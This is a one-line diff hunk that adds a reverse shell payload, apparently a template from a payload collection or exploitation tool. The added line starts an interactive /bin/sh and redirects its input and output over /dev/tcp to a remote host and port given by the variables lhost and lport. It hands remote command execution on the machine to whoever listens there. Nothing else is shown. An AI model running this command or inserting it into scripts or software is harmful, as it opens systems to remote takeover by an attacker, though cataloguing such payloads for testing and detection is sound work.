@@ -1,0 +1,1 @@
+/bin/sh -i >/dev/tcp/${lhost}/${lport} 2>&1 0>&1
